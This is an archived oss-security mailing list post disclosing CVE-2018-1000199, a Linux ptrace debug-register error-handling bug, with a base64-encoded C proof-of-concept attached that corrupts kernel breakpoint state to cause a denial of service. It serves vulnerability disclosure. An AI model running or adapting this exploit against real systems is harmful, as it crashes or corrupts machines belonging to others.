X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3946" "Tuesday" "1" "May" "2018" "15:35:06" "+0000" "Andy Lutomirski" "luto@kernel.org" "<CALCETrULDOyC7po=DcKzPRrYTmSY0ye0xtmtZ2xRD6Xxh9K24Q@mail.gmail.com>" "77" "[oss-security] CVE-2018-1000199: ptrace() incorrect error handling leads to corruption and DoS" nil nil nil "5" "2018050115:35:06" "[oss-security] CVE-2018-1000199: ptrace() incorrect error handling leads to corruption and DoS" (number mark "U       luto@kernel. May  1   77/3946  " thread-indent "\"[oss-security] CVE-2018-1000199: ptrace() incorrect error handling leads to corruption and DoS\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 13415 invoked by uid 550); 1 May 2018 15:35:58 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11969 invoked from network); 1 May 2018 15:35:31 -0000
DMARC-Filter: OpenDMARC Filter v1.3.2 mail.kernel.org AB7D222E01
Authentication-Results: mail.kernel.org; dmarc=none (p=none dis=none) header.from=kernel.org
Authentication-Results: mail.kernel.org; spf=none smtp.mailfrom=luto@kernel.org
X-Gm-Message-State: ALQs6tDvnidOpop45vwozOCosQeD0kOnbmXQPQCchZziCClTcpht3dQz
	41FGS6KpK6oQnF5RiuybtcvPGdfCtEIro/xHtxlrMw==
X-Google-Smtp-Source: AB8JxZrM4ekknZOo7B0UobUbuP5/zo1OO4p8BInzgPX8c/XI8rb4N/IF0gYhcmR79S2t6ARB12tGnZGnkxzBADVwk40=
X-Received: by 10.28.169.6 with SMTP id s6mr9369022wme.116.1525188917152; Tue,
 01 May 2018 08:35:17 -0700 (PDT)
MIME-Version: 1.0
From: Andy Lutomirski <luto@kernel.org>
Date: Tue, 01 May 2018 15:35:06 +0000
X-Gmail-Original-Message-ID: <CALCETrULDOyC7po=DcKzPRrYTmSY0ye0xtmtZ2xRD6Xxh9K24Q@mail.gmail.com>
Message-ID: <CALCETrULDOyC7po=DcKzPRrYTmSY0ye0xtmtZ2xRD6Xxh9K24Q@mail.gmail.com>
To: oss security list <oss-security@lists.openwall.com>
Content-Type: multipart/mixed; boundary="001a114b3eb69f9030056b26b727"
Subject: [oss-security] CVE-2018-1000199: ptrace() incorrect error handling leads to
 corruption and DoS

--001a114b3eb69f9030056b26b727
Content-Type: text/plain; charset="UTF-8"

The Linux ptrace code virtualizes access to the debug registers, and
the virtualization code has incorrect error handling.  This means that
if you write an illegal value to, say, DR0, the internal state of the
kernel's breakpoint tracking can become corrupt despite the fact that
the ptrace() call will return -EINVAL.

As a example, you can find the address of do_debug in /proc/kallsyms
on an x86 kernel and pass that address to the attached PoC.  I suspect
that architectures other than x86 are affected as well, but I haven't
tried to exploit it.  The bug itself is spread all over the place in
the kernel in generic and arch code.

I haven't spotted an obvious way to get privilege escalation using
this bug, but it may exist.  For example, it's plausible that using
this bug to target the perf NMI handler could result in overflowing
the NMI stack, resulting in various forms of corruption.  I haven't
tried to analyze the impact on non-x86 architectures since I only know
how x86 breakpoints work, but the effects of the bug could be very
different.

Linus has mostly fixed this upstream in commit
f67b15037a7a50c57f72e69a6d59941ad90a0f0f.  With that commit applied,
the error handling is still wrong but the defect results in a disabled
breakpoint instead of an incorrect breakpoint.

This bug was discovered by me.

--001a114b3eb69f9030056b26b727
Content-Type: text/x-csrc; charset="US-ASCII"; name="dr7_clash.c"
Content-Disposition: attachment; filename="dr7_clash.c"
Content-Transfer-Encoding: base64
Content-ID: <f_jgnu15xa0>
X-Attachment-Id: f_jgnu15xa0

LyogU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IEdQTC0yLjAgKi8KLyoKICog
Q29weXJpZ2h0IChjKSAyMDE4IEFuZHJldyBMdXRvbWlyc2tpCiAqIFBvQyBm
b3IgYSBwdHJhY2UoKSBidWcuICBQYXNzIHRoZSBhZGRyZXNzIG9mIGRvX2Rl
YnVnIHRvIHRoaXMgcHJvZ3JhbS4KICogQ1ZFLTIwMTgtMTAwMDE5OQogKi8K
I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5j
bHVkZSA8c3lzL3B0cmFjZS5oPgojaW5jbHVkZSA8c3lzL3R5cGVzLmg+CiNp
bmNsdWRlIDxzeXMvd2FpdC5oPgojaW5jbHVkZSA8c3lzL3VzZXIuaD4KI2lu
Y2x1ZGUgPHN5cy9zeXNjYWxsLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2lu
Y2x1ZGUgPGVycm5vLmg+CiNpbmNsdWRlIDxzdGRkZWYuaD4KI2luY2x1ZGUg
PHN0ZGlvLmg+CiNpbmNsdWRlIDxlcnIuaD4KI2luY2x1ZGUgPHN0cmluZy5o
PgojaW5jbHVkZSA8c2V0am1wLmg+CgpzdGF0aWMgdm9pZCBzZXRfZHIwX2Ry
Nyh1bnNpZ25lZCBsb25nIGRyMCwgdW5zaWduZWQgbG9uZyBkcjcpCnsKCXBp
ZF90IHBhcmVudCA9IGdldHBpZCgpOwoJaW50IHN0YXR1czsKCglwaWRfdCBj
aGlsZCA9IGZvcmsoKTsKCWlmIChjaGlsZCA8IDApCgkJZXJyKDEsICJmb3Jr
Iik7CgoJaWYgKGNoaWxkKSB7CgkJaWYgKHdhaXRwaWQoY2hpbGQsICZzdGF0
dXMsIDApICE9IGNoaWxkKQoJCQllcnIoMSwgIndhaXRwaWQgZm9yIGNoaWxk
Iik7Cgl9IGVsc2UgewoJCWlmIChwdHJhY2UoUFRSQUNFX0FUVEFDSCwgcGFy
ZW50LCBOVUxMLCBOVUxMKSAhPSAwKQoJCQllcnIoMSwgIlBUUkFDRV9BVFRB
Q0giKTsKCgkJaWYgKHdhaXRwaWQocGFyZW50LCAmc3RhdHVzLCAwKSAhPSBw
YXJlbnQpCgkJCWVycigxLCAid2FpdHBpZCBmb3IgY2hpbGQiKTsKCgkJcHJp
bnRmKCJXaWxsIHNldCBEUjA9JWx4LCBEUjc9JWx4XG4iLCBkcjAsIGRyNyk7
CgoJCWlmIChwdHJhY2UoUFRSQUNFX1BPS0VVU0VSLCBwYXJlbnQsICh2b2lk
ICopb2Zmc2V0b2Yoc3RydWN0IHVzZXIsIHVfZGVidWdyZWdbMF0pLCBkcjAp
ICE9IDApCgkJCWVycigxLCAiUFRSQUNFX1BPS0VVU0VSIERSMCA9ICVseCIs
IGRyMCk7CgoJCWlmIChwdHJhY2UoUFRSQUNFX1BPS0VVU0VSLCBwYXJlbnQs
ICh2b2lkICopb2Zmc2V0b2Yoc3RydWN0IHVzZXIsIHVfZGVidWdyZWdbN10p
LCBkcjcpICE9IDApCgkJCWVycigxLCAiUFRSQUNFX1BPS0VVU0VSIERSNyA9
ICVseCIsIGRyNyk7CgoJCWlmIChwdHJhY2UoUFRSQUNFX0RFVEFDSCwgcGFy
ZW50LCBOVUxMLCBOVUxMKSAhPSAwKQoJCQllcnIoMSwgIlBUUkFDRV9ERVRB
Q0giKTsKCgkJZXhpdCgwKTsKCX0KfQoKaW50IG1haW4oaW50IGFyZ2MsIGNo
YXIgKiphcmd2KQp7Cgl1bnNpZ25lZCBsb25nIGRhbmdlcl9kcjA7CglpZiAo
YXJnYyA9PSAyKSB7CgkJY2hhciAqZW5kOwoJCWRhbmdlcl9kcjAgPSBzdHJ0
b3VsbChhcmd2WzFdLCAmZW5kLCAxNik7Cgl9IGVsc2UgewoJCXByaW50Zigi
VXNhZ2U6ICVzIERSMFxuXG5TZXQgRFIwIHRvIGEgcHJvYmxlbWF0aWMgYWRk
cmVzc1xuIik7CgkJZGFuZ2VyX2RyMCA9IDB4ODAwMDAwMDAwMDAwMDAwMDsK
CX0KCglzZXRfZHIwX2RyNygxLCAxKTsKCXNldF9kcjBfZHI3KGRhbmdlcl9k
cjAsIDApOwoKCWFzbSB2b2xhdGlsZSAoIi5ieXRlIDB4ZjEiKTsKCXJldHVy
biAwOwp9Cg==

--001a114b3eb69f9030056b26b727--
